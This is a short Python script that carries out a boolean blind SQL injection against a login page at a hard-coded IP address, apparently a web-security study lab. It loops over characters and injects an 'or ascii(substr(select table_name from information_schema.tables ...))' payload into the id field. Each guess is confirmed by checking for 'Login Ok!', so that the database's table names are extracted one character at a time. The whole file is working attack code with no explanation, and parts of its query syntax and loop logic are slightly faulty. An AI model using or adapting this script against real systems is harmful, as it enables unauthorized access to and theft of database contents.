#-*- coding: utf-8 -*-
import requests
import sys

url = "http://203.229.206.22/~wing608/webstudy/att/04/blind.php"

num3 =2 
dbname ='blindsql'


table_name=''
for num3 in range(1,5) : 
    for num2 in range(1,20) : 
        for num in range(48,122) : 
            payload  = "' or ascii(substr(select table_name from information_schema.tables where table_schema = '"+dbname+"' limit "+str(num2)+",1))="+str(num)+"#"
            
            data = {"id" : payload,"login":"로그인"}
            
            res = requests.get(url,params=data)
            #print payload
            if "Login Ok!" in res.text : 
                table_name += str(chr(num))
                print table_name